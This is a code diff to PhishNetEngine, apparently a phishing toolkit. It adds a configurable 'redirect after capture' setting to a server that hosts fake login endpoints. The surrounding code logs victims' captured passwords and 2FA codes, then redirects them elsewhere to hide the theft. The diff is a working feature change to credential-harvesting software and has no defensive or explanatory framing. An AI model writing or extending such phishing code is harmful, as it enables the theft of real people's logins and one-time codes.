@@ -101,16 +101,18 @@ export class PhishNetEngine {
             this.site = config.site;
             this.port = config.port;
             this.endpoints = config.endpoints;
+            this.redirect = config.redirect || 'https://google.com';
             this.projectName = project;
             
             console.log(chalk.green(`Loaded project: ${project}`));
             console.log(chalk.gray(`   Site: ${config.site}`));
             console.log(chalk.gray(`   Endpoints: ${config.endpoints.join(', ')}`));
+            console.log(chalk.gray(`   Redirect: ${config.redirect}`));
             console.log(chalk.gray(`   Port: ${config.port}`));
             return;
         }
 
-        const { name, site, endpoints } = await inquirer.prompt([
+        const { name, site, endpoints, redirect } = await inquirer.prompt([
             {
                 type: 'input',
                 name: 'name',
@@ -128,13 +130,20 @@ export class PhishNetEngine {
                 name: 'endpoints',
                 message: 'Endpoints (comma separated, e.g., /login,/auth) [default: /login]:',
                 default: '/login'
+            },
+            {
+                type: 'input',
+                name: 'redirect',
+                message: 'Redirect URL after capture:',
+                default: 'https://google.com',
+                validate: url => /^https?:\/\//.test(url) || 'Enter a valid URL'
             }
         ]);
 
         this.site = site;
         this.projectName = name;
         this.endpoints = endpoints.split(',').map(e => e.trim());
-        
+        this.redirect = redirect;
         const sitePath = path.join(CONFIG.paths.sites, this.projectName);
         await fs.ensureDir(sitePath);
         await fs.ensureDir(path.join(sitePath, 'css'));
@@ -145,6 +154,7 @@ export class PhishNetEngine {
             name,
             site,
             endpoints: this.endpoints,
+            redirect,
             port: this.port,
             created: Date.now()
         };
@@ -255,7 +265,7 @@ export class PhishNetEngine {
                 if (normalized.password) console.log(chalk.white(`    Password: ${'*'.repeat(Math.min(normalized.password.length, 10))}`));
                 if (normalized.otp) console.log(chalk.white(`    2FA: ${normalized.otp}`));
                 
-                const redirectUrl = req.body.redirect || 'https://google.com';
+                const redirectUrl = this.redirect || 'https://google.com';
                 res.redirect(redirectUrl);
             });
         });
